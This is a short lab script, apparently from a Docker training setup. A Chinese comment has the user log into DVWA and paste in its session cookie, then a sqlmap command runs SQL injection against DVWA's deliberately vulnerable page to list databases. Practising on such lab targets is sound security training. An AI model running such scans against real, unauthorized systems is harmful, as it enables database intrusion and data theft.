#####
# 先登录dvwa，获取session，替换参数值，参考 ./snap/dvwa-session.png
#####
docker exec sqlmap_sqlmap_1 python sqlmap.py -u "http://web-dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low;PHPSESSID=qdfab5bhkingom6c4kdubq4pg1" --batch --dbs
